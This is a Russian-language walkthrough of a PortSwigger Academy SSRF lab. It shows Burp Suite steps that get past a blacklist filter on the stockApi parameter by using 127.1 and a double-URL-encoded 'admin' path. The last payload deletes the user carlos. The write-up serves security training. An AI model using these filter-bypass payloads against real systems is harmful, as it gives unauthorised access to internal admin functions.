перейдем на `/admin` и найдем данный запрос в `Proxy` -> `HTTP history` и видим, что у нас недостаточно прав для просмотра данного каталога
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/3.%20SSRF%20with%20blacklist-based%20input%20filter/pics%20for%20walktrough/1.png)
Зайдем на случайный товар и проверим его наличие
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/3.%20SSRF%20with%20blacklist-based%20input%20filter/pics%20for%20walktrough/2.png)
Найдем данный запрос на проверку количества товара в `Proxy` -> `HTTP history`
```
POST /product/stock HTTP/2
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/3.%20SSRF%20with%20blacklist-based%20input%20filter/pics%20for%20walktrough/3.png)
Изменим параметр `stockApi` на `127.0.0.1`
```
POST /product/stock HTTP/2
...
stockApi=http%3A%2F%2F127.0.0.1
```
И увидим 400 респонс статус код
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/3.%20SSRF%20with%20blacklist-based%20input%20filter/pics%20for%20walktrough/4.png)
но вот если мы отправим `stockApi=http://127.1` то нас успешно редиректнет на корневую страницу
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/3.%20SSRF%20with%20blacklist-based%20input%20filter/pics%20for%20walktrough/5.png)
Сответсвенно попробуем пробраться на `stockApi=http://127.1/admin` 

...и снова нас ждет неудача и 400 статус респонс код
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/3.%20SSRF%20with%20blacklist-based%20input%20filter/pics%20for%20walktrough/6.png)
попробуем перевести в URL кодировку `admin` тем самым обойти блокировку. Для этого перейдем в `Decoder` и дважды выберем `Encode as URL`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/3.%20SSRF%20with%20blacklist-based%20input%20filter/pics%20for%20walktrough/7.png)
вернемся и заменим `stockApi`
```
POST /product/stock HTTP/2
...
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/3.%20SSRF%20with%20blacklist-based%20input%20filter/pics%20for%20walktrough/8.png)
и после использования кнопки `Follow redirection` получим уведомление об успешно выполненной лаборатоной работе
